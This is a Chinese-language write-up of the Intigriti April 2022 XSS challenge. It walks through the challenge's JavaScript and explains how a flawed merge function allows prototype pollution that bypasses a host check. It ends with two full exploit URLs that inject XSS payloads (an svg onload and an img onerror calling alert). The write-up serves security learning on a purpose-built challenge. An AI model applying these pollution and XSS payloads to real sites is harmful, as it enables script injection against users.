intigriti-0422-XSS-Challenge-Write-up
1
intigriti-0422-XSS-Challenge-
Write-up
前⾔
intigriti新出的challenge，猜到是原型链污染的题，但是许多点（因为菜）没有反应过
来，同时学到了⼀点新知识，应各位师傅要求分享⼀下。
不了解JavaScript原型链污染攻击的，可以先去P师傅博客预习⼀下。
https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html
原题地址
https://challenge-0422.intigriti.io/
解题思路
题⽬主体
function main() { 
    const qs = m.parseQueryString(location.search) 
    let appConfig = Object.create(null) 
    appConfig["version"] = 1337 
    appConfig["mode"] = "production" 
    appConfig["window-name"] = "Window" 
    appConfig["window-content"] = "default content" 
    appConfig["window-toolbar"] = ["close"] 
    appConfig["window-statusbar"] = false 
    appConfig["customMode"] = false 
    if (qs.config) { 
        merge(appConfig, qs.config) 
        appConfig["customMode"] = true 
    } 
    let devSettings = Object.create(null) 
    devSettings["root"] = document.createElement('main') 
    devSettings["isDebug"] = false 
    devSettings["location"] = 'challenge-0422.intigriti.io' 
    devSettings["isTestHostOrPort"] = false 
    if (checkHost()) { 
intigriti-0422-XSS-Challenge-Write-up
2
        devSettings["isTestHostOrPort"] = true 
        merge(devSettings, qs.settings) 
    } 
    if (devSettings["isTestHostOrPort"] || devSettings["isDebug"]) { 
        console.log('appConfig', appConfig) 
        console.log('devSettings', devSettings) 
    } 
    if (!appConfig["customMode"]) { 
        m.mount(devSettings.root, App) 
    } else { 
        m.mount(devSettings.root, {view: function() { 
                return m(CustomizedApp, { 
                    name: appConfig["window-name"], 
                    content: appConfig["window-content"] , 
                    options: appConfig["window-toolbar"], 
                    status: appConfig["window-statusbar"] 
                }) 
            }}) 
    } 
    document.body.appendChild(devSettings.root) 
} 
function checkHost() { 
    const temp = location.host.split(':') 
    const hostname = temp[0] 
    const port = Number(temp[1]) || 443 
    return hostname === 'localhost' || port === 8080 
} 
function isPrimitive(n) { 
    return n === null || n === undefined || typeof n === 'string' || typeof n === 'boolea
n' || typeof n === 'number' 
} 
function merge(target, source) { 
    let protectedKeys = ['__proto__', "mode", "version", "location", "src", "data", "m"] 
    for(let key in source) { 
        if (protectedKeys.includes(key)) continue 
        if (isPrimitive(target[key])) { 
            target[key] = sanitize(source[key]) 
        } else { 
            merge(target[key], source[key]) 
        } 
    } 
} 
function sanitize(data) { 
    if (typeof data !== 'string') return data 
    return data.replace(/[<>%&\$\s\\]/g, '_').replace(/script/gi, '_') 
} 
intigriti-0422-XSS-Challenge-Write-up
3
main();
核⼼在于merge⽅法， merge 的意思是融合。很明显这是⼀道原型链污染的题⽬。
把 merge 拆开来看⾥⾯做了哪些事情
protectedKeys 定义了⼀些属性，如果有这些属性，就直接跳过
isPrimitive ⽤于判断数据类型，如果为 null 、 undefined 、 string 、 boolean 、 number
类型的值时，会进⼊⼀个简单的过滤⽅法sanitize中，去掉⼀些特殊符号，并将给
target赋予新的属性值
let a = {}; 
a.id = 1; 
a.name = "a"; 
let b = {}; 
b.id = 1; 
b.name = 2; 
b.port = 3; 
merge(a, b); 
console.log('object a ->',a); 
console.log('object b ->',b); 
//object a -> { id: 1, name: 2, port: 3 } 
//object b -> { id: 1, name: 2, port: 3 }
先理解了这⼀部分，再来看题⽬逻辑就清晰很多了，challenge的最终触发流程在于
document.body.appendChild(devSettings.root)
所以我们需要去修改 devSettings.root 的属性，往上追溯，如果要⾛到这个流程，必须修
改使得 checkHost() 的值为 true ，才能够进⼊ merge ⽅法中，对 devSettings 对象的值进⾏
修改。
function checkHost() { 
    const temp = location.host.split(':') 
    const hostname = temp[0] 
    const port = Number(temp[1]) || 443 
    return hostname === 'localhost' || port === 8080 
}
intigriti-0422-XSS-Challenge-Write-up
4
checkHost() 的判断条件为 hostname 等于 localhost 或是 port 等于 8080 ，显然从正常情况下
来看，⽆论如何都不可能满⾜这个条件的。但是这⾥作者设计了⼀个很巧妙的代码，重点
在于 temp[1] ， temp 是⼀个数组，从数组中取了下标 1 这个值。
'1' == 1 
// true 
a['1'] == a[1] 
// true
JavaScript中，数组的下标可以⽤字符或是字符串数字来取值，所以在原型链中，我们可
以给[]对象添加⼀个名称为1的属性，这样 temp 在通过下标 1 取值的时候，实际上取到的
是数组中属性为 1 的值
[].constructor.prototype['1'] = 8080 
//[1: 8080, constructor: ƒ, concat: ƒ, copyWithin: ƒ, fill: ƒ, find: ƒ, …]
根据代码逻辑，我们需要同时满⾜对象类型为Array，且可被merge的参数，满⾜这样条
件的只有    appConfig["window-toolbar"] = ["close"]
我们的伪代码应当为
appConfig["window-toolbar"].constructor['1'] = 8080
接下来要做的，就是继续去替换 devSettings.root 的值了，替换body中的值即可。
解题⼀
污染 config 和 settings 的解法
https://challenge-0422.intigriti.io/challenge/Window%20Maker.html?config[window-toolbar][c
onstructor][prototype][1]=8080&settings[root][ownerDocument][body][children][1][outerHTML]
[1]=%3Csvg%20onload%3Dalert(1)%3E
解法⼆
污染 innerHTML 的解法（来⾃intigriti群组的DrBrix）
https://challenge-0422.intigriti.io/challenge/Window%20Maker.html?config[window-toolbar][c
onstructor][constructor][prototype][xd][s]=1&config[window-toolbar][constructor][construct
intigriti-0422-XSS-Challenge-Write-up
5
or][constructor][prototype][xd][constructor][prototype][innerHTML][0]=%3Cimg%20src%3da%20o
nerror%3dalert(document.domain);alert%3dundefined%3E
思考题
为什么不直接污染 appConfig 或是 devSettings 来快速⾛流程？